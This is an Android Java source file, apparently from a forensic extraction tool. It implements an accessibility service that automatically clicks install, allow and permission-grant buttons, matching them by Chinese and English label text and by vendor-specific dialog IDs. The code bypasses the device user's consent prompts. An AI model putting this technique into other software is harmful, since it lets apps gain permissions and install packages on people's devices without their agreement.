package com.forensic.extract.services;

import android.accessibilityservice.AccessibilityService;
import android.text.TextUtils;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public class AccessibleService extends AccessibilityService {
    // 检测到内容节点时调用
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo source = accessibilityEvent.getSource();
        if(source!=null){
            int eventType = accessibilityEvent.getEventType();
            if(eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || eventType == AccessibilityEvent.TYPE_WINDOWS_CHANGED){
                iterateNodesAndHandle(source);
            }
        }
    }

    // 终止accessibility service 时调用
    @Override
    public void onInterrupt() {

    }

    // 服务连接时调用
    public void onServiceConnected(){

    }

    private boolean iterateNodesAndHandle(AccessibilityNodeInfo accessibilityNodeInfo){
        if(accessibilityNodeInfo!=null){
            CharSequence className = accessibilityNodeInfo.getClassName();
            String resourceName = accessibilityNodeInfo.getViewIdResourceName();
            if("android.widget.Button".contentEquals(className)||"android.widget.TextView".contentEquals(className)){
                CharSequence text = accessibilityNodeInfo.getText();
                if(text == null){
                    return false;
                }
                String charSequence = text.toString();
                Set<String> actions = new HashSet<>(Arrays.asList(
                        "安装", "完成", "仅在使用该应用时允许", "仅使用时允许", "仅使用期间允许",
                        "仅在使用此应用时允许", "仅在使用中允许", "仅限这一次", "允许一次", "确定",
                        "继续安装", "继续", "允许", "始终允许", "使用此文件夹", "立刻连接",
                        "allow", "uninstall"
                ));
                if(actions.contains(charSequence.toString().toLowerCase())) {
                    accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
            else if(!TextUtils.isEmpty(resourceName)){
                Set<String> allowedButtonIds = new HashSet<>(Arrays.asList(
                        "com.android.packageinstaller:id/permission_allow_button",
                        "com.android.permissioncontroller:id/permission_allow_button",
                        "com.android.permissioncontroller:id/permission_allow_always_button",
                        "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                        "com.huawei.systemmanager:id/btn_allow",
                        "com.lbe.security.miui:id/permission_allow_foreground_only_button",
                        "vivo:id/allow_button"
                ));
                if (allowedButtonIds.contains(resourceName)) {
                    accessibilityNodeInfo.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
            int childCount = accessibilityNodeInfo.getChildCount();
            for(int i=0;i<childCount;i++){
                if(iterateNodesAndHandle(accessibilityNodeInfo.getChild(i))){
                    return true;
                }
            }
        }
        return false;
    }
}
